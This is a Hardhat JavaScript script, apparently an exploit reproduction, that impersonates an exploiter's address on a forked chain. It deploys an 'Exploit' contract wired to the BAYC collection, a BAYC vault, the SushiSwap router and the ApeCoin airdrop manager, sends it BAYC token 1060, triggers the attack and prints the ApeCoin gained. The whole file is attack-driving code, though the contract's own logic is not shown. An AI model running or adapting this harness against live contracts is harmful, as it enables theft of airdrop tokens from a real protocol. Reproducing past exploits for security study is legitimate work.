const { ethers } = require("hardhat");

const execute = async() => {
    //impersonate exploiter account
    await hre.network.provider.request({
        method: "hardhat_impersonateAccount",
        params: ["0x6703741e913a30d6604481472b6d81f3da45e6e8"],
    });
    const exploiterSigner = await ethers.getSigner("0x6703741e913a30d6604481472b6d81f3da45e6e8");

    const baycAddr = "0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D";
    const baycVaultAddr = "0xea47b64e1bfccb773a0420247c0aa0a3c1d2e5c5";
    const sushiSwapRouterAddr = "0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F";
    const apeCoinAddr = "0x4d224452801aced8b2f0aebe155379bb5d594381";
    const apeCoinAirdropManagerAddr = "0x025C6da5BD0e6A5dd1350fda9e3B6a614B205a1F";

    await hre.run("compile");
    
    const exploitContractFactory = await ethers.getContractFactory('Exploit', exploiterSigner);
    const exploitContract = await exploitContractFactory.deploy(
        baycAddr, baycVaultAddr, sushiSwapRouterAddr, apeCoinAirdropManagerAddr, apeCoinAddr);
    
    //Transfer 1 bayc to the exploit contract
    const erc721abi = ["function safeTransferFrom(address from, address to, uint256 tokenId) external"];
    const baycContract = new ethers.Contract(baycAddr, erc721abi, exploiterSigner);
    let tx = await baycContract.safeTransferFrom(exploiterSigner.address, exploitContract.address, 1060);
    await tx.wait();

    //execute the exploit
    tx = await exploitContract.execute();
    await tx.wait();
    
    //final check for receiving ApeCoin
    const erc20Abi = ["function balanceOf(address) external view returns (uint256)"];
    const apeCoinContract = new ethers.Contract(apeCoinAddr, erc20Abi, exploiterSigner);
    const apeCoinBalance = await apeCoinContract.balanceOf(exploiterSigner.address);
    console.log("Exploit address now has %s ApeCoin", ethers.utils.formatEther(apeCoinBalance.toString()));

}

execute()
    .then(() => process.exit(0))
    .catch((error) => console.error(error));